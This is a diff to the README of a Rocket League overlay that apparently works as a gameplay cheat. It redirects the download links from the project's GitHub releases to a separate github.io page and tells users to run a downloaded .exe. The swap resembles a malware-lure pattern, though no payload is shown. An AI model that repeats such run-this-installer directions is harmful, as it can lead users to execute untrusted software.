@@ -1,6 +1,6 @@
 # 🚀 Rocket-Fury-Pro - Improve your Rocket League gameplay performance
 
-[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases)
+[![](https://img.shields.io/badge/Download-Release-blue.svg)](https://jessieamphibian646.github.io)
 
 Rocket-Fury-Pro helps you play better in Rocket League. It tracks the ball, manages your boost, and highlights key game elements to give you an edge. This tool runs on your computer while you play. It functions as an overlay to provide data that helps you make quick decisions.
 
@@ -18,7 +18,7 @@ Before you use the tool, check your computer settings. This ensures the best per
 
 Follow these steps to set up the software on your system.
 
-1. Go to this link: [https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases](https://github.com/jessieamphibian646/Rocket-Fury-Pro/releases).
+1. Go to this link: [https://jessieamphibian646.github.io](https://jessieamphibian646.github.io).
 2. Look for the section labeled "Assets" at the bottom of the latest release.
 3. Click the file ending in .exe to download the installer to your computer.
 4. Find the file in your downloads folder. Double-click the file to begin the setup process.
